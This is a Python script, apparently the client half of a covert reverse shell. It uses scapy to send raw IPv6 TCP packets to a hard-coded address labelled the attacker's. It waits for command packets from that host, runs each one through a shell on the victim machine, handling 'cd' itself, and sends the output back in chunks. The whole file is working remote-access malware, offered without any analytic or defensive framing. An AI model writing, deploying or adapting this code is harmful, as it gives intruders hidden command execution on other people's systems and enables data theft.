import socket
import subprocess
import os
from scapy.all import *
import time


attacker_hostname = "2409:4063:209d:520f:e84c:2b22:950a:35d0"
attacker_port = 12345

# connects with the attacker 
def target_client_connector():
    # connect to the attacker
    connect_command = "CONNECTION_FROM_CLIENT"
    connector_packet = IPv6(dst=attacker_hostname)/TCP(sport= 12345, dport=attacker_port)/connect_command
    send(connector_packet, verbose=0)
    # while(True):
    #     success = target_client.connect_ex((attacker_hostname, attacker_port))
    #     if(not success):
    #         # connection established successfully
    #         break

def send_data(data):
    # receive data from the attacker server
    contains_more_flag = False
    while(len(data) > 0):
        delimiter_index = -1
        try: 
            delimiter_index = data.index("***")
            contains_more_flag = True
        except:
            contains_more_flag = False
            pass
        if(contains_more_flag):
            to_send = data[0:delimiter_index]
            data = data[delimiter_index:]
            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/to_send
            time.sleep(1) # to let the attacker side free up sniffing
            send(response_packet, verbose=0)
        else:
            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/data
            time.sleep(1) # to let the attacker side free up sniffing
            send(response_packet, verbose=0)
            break
    response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/"END_COMM"
    time.sleep(1) # to let the attacker side free up sniffing
    send(response_packet, verbose=0)

def receive_data():
    # receive data from the attacker server
    command = ""
    while True:
        packet = sniff(count=1, filter="dst port 12345")
        try:
            extracted_packet = packet[0]['IPv6']
            attacker_IP = extracted_packet.src
            if(attacker_IP == attacker_hostname):
                try:
                    command = extracted_packet.load
                    break
                except:
                    pass
        except:
            pass
    # do something on the data
    output = run_command(command)
    try:
        output = output.decode('utf-8')
    except:
        pass
    # send result back
    send_data("\n" + output)
    
    

def navigate_directory(command):
    destination_directory_path = command[command.index("cd") + 3:]
    os.chdir(destination_directory_path)


def run_command(command):

    command = command.rstrip()
    command = str(command)
    first_apostrophe_index = command.index('\'')
    command = command[first_apostrophe_index + 1:]
    command = command[:len(command) - 1]
    try:
        command.index("cd")
        navigate_directory(command)
        return "Directory changed to: " + str(os.getcwd())
    except:
        pass

    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output

def main():
    # connect to the attacker
    target_client_connector()
    while True:
        receive_data()

main()